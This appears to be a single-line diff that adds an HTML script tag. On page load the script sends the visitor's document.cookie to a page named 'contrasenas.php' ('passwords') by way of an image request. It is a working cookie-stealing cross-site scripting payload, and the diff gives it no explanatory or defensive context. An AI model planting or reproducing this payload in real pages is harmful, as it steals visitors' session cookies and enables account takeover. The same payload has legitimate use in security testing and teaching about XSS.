@@ -1,0 +1,1 @@
+<script type="text/javascript"> img=new Image();img.src="contrasenas.php?contrasena="+document.cookie;</script>
